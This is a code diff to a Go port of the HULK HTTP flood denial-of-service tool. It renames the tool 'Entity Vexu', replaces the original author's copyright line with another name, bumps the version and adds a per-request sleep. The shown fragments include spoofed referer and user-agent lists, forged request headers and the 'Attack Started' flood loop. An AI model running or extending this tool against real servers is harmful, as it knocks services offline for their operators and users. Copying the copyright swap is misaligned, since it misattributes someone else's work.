@@ -1,10 +1,10 @@
 package main
 
 /*
- HULK DoS tool on <strike>steroids</strike> goroutines. Just ported from Python with some improvements.
+ Entity Vexu DoS tool on <strike>steroids</strike> goroutines. Just ported from Python with some improvements.
  Original Python utility by Barry Shteiman http://www.sectorix.com/2012/05/17/hulk-web-server-dos-tool/
  This go program licensed under GPLv3.
- Copyright Alexander I.Grafov <grafov@gmail.com>
+ Copyright Blackout Doninion <blackout.dominion@proton.me>
 */
 
 import (
@@ -20,11 +20,11 @@ import (
 	"strings"
 	"sync/atomic"
 	"syscall"
+	"time"
 )
 
-const __version__  = "1.0.1"
+const __version__  = "2.0.0"
 
-// const acceptCharset = "windows-1251,utf-8;q=0.7,*;q=0.7" // use it for runet
 const acceptCharset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
 
 const (
@@ -34,15 +34,12 @@ const (
 	targetComplete
 )
 
-// global params
 var (
 	safe            bool     = false
 	headersReferers []string = []string{
 		"http://www.google.com/?q=",
 		"http://www.usatoday.com/search/results?q=",
 		"http://engadget.search.aol.com/search?q=",
-		//"http://www.google.ru/?hl=ru&q=",
-		//"http://yandex.ru/yandsearch?text=",
 	}
 	headersUseragents []string = []string{
 		"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
@@ -123,7 +120,7 @@ func main() {
 	}
 
 	go func() {
-		fmt.Println("-- HULK Attack Started --\n           Go!\n\n")
+		fmt.Println("-- Entity Vexu Attack Started --\n           Go!\n\n")
 		ss := make(chan uint8, 8)
 		var (
 			err, sent int32
@@ -195,8 +192,6 @@ func httpcall(url string, host string, data string, headers arrayFlags, s chan u
 		q.Header.Set("Connection", "keep-alive")
 		q.Header.Set("Host", host)
 
-		// Overwrite headers with parameters
-
 		for _, element := range headers {
 			words := strings.Split(element, ":")
 			q.Header.Set(strings.TrimSpace(words[0]), strings.TrimSpace(words[1]))
@@ -219,6 +214,7 @@ func httpcall(url string, host string, data string, headers arrayFlags, s chan u
 				s <- targetComplete
 			}
 		}
+		time.Sleep(time.Millisecond * 100)
 	}
 }
 
